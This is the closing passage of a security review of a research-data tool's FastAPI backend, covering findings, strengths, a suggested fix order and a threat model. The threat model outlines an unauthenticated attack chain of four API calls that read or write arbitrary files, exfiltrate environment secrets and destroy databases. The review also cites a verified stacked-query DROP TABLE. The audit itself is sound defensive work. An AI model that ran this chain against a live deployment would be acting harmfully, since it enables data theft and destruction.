- `README.md` "Configuration Example" has a prose paragraph spliced inside
  the YAML code fence (invalid example); "Available CLI Options" omits the
  required positional `TARGET`.

### 3.9 Log injection (LOW)
File sink format `{message}` unescaped (`logging_config.py:117,130`);
project names, targets, and queries logged verbatim → newline-forged log
lines.

### 3.10 Minor
- `src/utility.py:433,675` — `import_sub_modules` / `import_submodules`
  near-duplicates; delete one.
- isort `line_length = 142` vs black/ruff 140; both black and ruff-format
  configured (pick one).
- `frontend/Dockerfile` — `node:18-alpine` EOL, stale standalone build.
- `backend/app/api/v1/endpoints/tasks.py:502` — inline
  `__import__("src.model", ...)`; import at module top.
- `backend/app/api/v1/endpoints/logs.py:42` — full-file `readlines()` to
  tail logs.

---

## What is done well (consistent across all reviewers)

- No `eval`/`exec` anywhere — hand-rolled DSL parser with a function allowlist.
- `SecretStr` for passwords in API models; `SafeLoader` for YAML.
- Path-traversal guards done correctly where they exist
  (`help_docs.py`, `data_source_service.py`).
- Frozen lockfiles both sides (`uv.lock`, `pnpm-lock.yaml`); non-root
  container user; nginx security headers; `.pgpass` mounted `:ro`.
- 173 test files (`tests/` + `backend/tests/`).
- `src/path_resolution.py` reused by the backend instead of re-implemented.

## Suggested fix order (updated after practical verification)

1. **Auth + path guard + CORS** (one PR): shared-secret or proxy auth on the
   router, `is_relative_to()` guard on the download/execute `target` params,
   tighten CORS to the org's tunnel namespaces.
2. **SQL guards** (small PR): reject multi-statement queries (fixes the
   verified `DROP TABLE`), fix `inject_limit` to operate per-statement or not
   at all, shared identifier-quoting helper.
3. **Error-message hygiene**: stop returning raw exception strings to the
   client (fixes the verified env-var exfiltration) —
   `data_source_service.py:254` and the query/execute error paths.
4. **Ingester API** (main): either wire `setup_config_store` into the API
   lifespan (making the endpoints work — and the 1.5 risks real) or remove
   the endpoints. On dev the config store was deleted, so the ingester's
   `ConfigValue` calls need a different fix (or the endpoints removed).
   Also add the dropped `password` field to `PostgresSqlLoader.db_opts` (N1).
5. **Pin UCanAccess + fix the `cp`** (ten minutes).
6. **Hygiene sweep**: port default, `__int__.py` rename, Makefile fixes,
   `lib/` handling, CLI doc corrections, strip personal paths/URLs.

## Threat model note

Rankings assume the real deployment: shared server (`/home/sead/sead-tools`),
nginx in front (note: no nginx config exists in the repo — the "in front" is
an assumption), team on a LAN, holds credentials for the production SEAD
database. Worst concrete chain (all unauthenticated):

```
PUT  /api/v1/projects/{name}/raw-yaml      # write malicious YAML
POST /api/v1/projects/{name}/execute       # arbitrary file write + DB dispatch
POST /api/v1/data-sources/{f}/test         # exfil any env var via error text
GET  /api/v1/projects/{name}/execute/download?target=...  # read any file
```

One session: read any file, write any file, steal env secrets, destroy any
reachable database.

**Worst case** (subject to preconditions P1/P2): full exfiltration of the
SEAD dataset via `query/execute` (S1: whole tables per request) or via db
dispatch pointed at an attacker-controlled database (R1), plus silent
tamper via the stacked-query bypass, plus credential theft (`.pgpass`).

**Most likely case**: quiet, partial, attributable-but-unremarkable data
theft by a low-skill actor with network access — starting from the public
Swagger UI at `/api/v1/docs`, using the same `query/execute` endpoint the UI
itself uses, leaving access-log lines indistinguishable from normal use (R5).
Realistic actors: a curious student, a departing collaborator, or a
researcher who wants the dataset. Both cases are closed by the same first PR:
FastAPI-level auth (R6) + path guards + CORS tightening.
